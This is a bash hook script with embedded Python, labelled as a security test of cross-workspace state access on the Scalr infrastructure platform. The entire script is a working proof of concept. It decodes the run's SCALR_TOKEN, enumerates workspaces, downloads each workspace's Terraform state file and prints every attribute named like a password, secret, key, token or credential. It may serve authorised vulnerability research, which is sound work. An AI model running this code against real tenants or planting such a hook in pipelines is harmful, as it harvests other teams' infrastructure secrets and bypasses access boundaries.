#!/bin/bash
# Security test: cross-workspace state file access via SCALR_TOKEN
echo "[hook] token issuer:"
echo "$SCALR_TOKEN" | cut -d. -f2 | python3 -c "import sys,base64,json; raw=sys.stdin.read().strip(); pad=raw+'=='*4; print(json.loads(base64.b64decode(pad+('='*(4-len(pad)%4))[:4-len(pad)%4] if len(pad)%4 else pad)))" 2>/dev/null || true

echo "[hook] enumerating workspaces..."
curl -sf "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces?filter%5Benvironment%5D=$SCALR_ENVIRONMENT_ID&page%5Bsize%5D=20" \
  -H "Authorization: Bearer $SCALR_TOKEN" -H "Accept: application/vnd.api+json" 2>/dev/null > /tmp/ws_list.json

python3 << 'PYEOF'
import json, subprocess, os

with open('/tmp/ws_list.json') as f:
    data = json.load(f)

token = os.environ['SCALR_TOKEN']
hostname = os.environ['SCALR_HOSTNAME']

for ws in data.get('data', []):
    ws_id = ws['id']
    ws_name = ws['attributes'].get('name', '?')
    print(f"[workspace] {ws_name} ({ws_id})")

    # Get current state version using Scalr API
    r = subprocess.run([
        'curl', '-sf',
        f'https://{hostname}/api/iacp/v3/workspaces/{ws_id}/current-state-version',
        '-H', f'Authorization: Bearer {token}',
        '-H', 'Accept: application/vnd.api+json'
    ], capture_output=True, text=True)

    if r.returncode != 0 or not r.stdout.strip():
        print(f"  [state] no access (empty response)")
        continue

    try:
        sv = json.loads(r.stdout)
    except:
        print(f"  [state] parse error: {r.stdout[:100]}")
        continue

    if 'errors' in sv:
        print(f"  [state] error: {sv['errors']}")
        continue

    # Get download URL from links
    links = sv.get('data', {}).get('links', {})
    dl_url = links.get('download') or links.get('state-blob')
    attrs = sv.get('data', {}).get('attributes', {})
    outputs = attrs.get('outputs', {})

    print(f"  [state] serial={attrs.get('serial')} size={attrs.get('size')} download_url={'YES' if dl_url else 'NO'}")
    if outputs:
        print(f"  [OUTPUTS] {list(outputs.keys())}")

    if dl_url:
        # Download the actual state file
        dl = subprocess.run([
            'curl', '-sf', dl_url,
            '-H', f'Authorization: Bearer {token}'
        ], capture_output=True, text=True)
        if dl.returncode == 0 and dl.stdout.strip():
            try:
                state = json.loads(dl.stdout)
                resources = state.get('resources', [])
                print(f"  [STATE FILE] {len(resources)} resources")
                for res in resources[:5]:
                    attrs_vals = {}
                    for inst in res.get('instances', [])[:1]:
                        for k, v in (inst.get('attributes', {}) or {}).items():
                            if any(s in k.lower() for s in ['password','secret','key','token','credential']):
                                attrs_vals[k] = v
                    if attrs_vals:
                        print(f"  [SECRETS IN STATE] {res.get('type')}.{res.get('name')}: {attrs_vals}")
                    else:
                        print(f"  [resource] {res.get('type')}.{res.get('name')}")
            except:
                print(f"  [STATE RAW] {dl.stdout[:500]}")
        else:
            print(f"  [state dl] failed: {dl.stderr[:100]}")
PYEOF
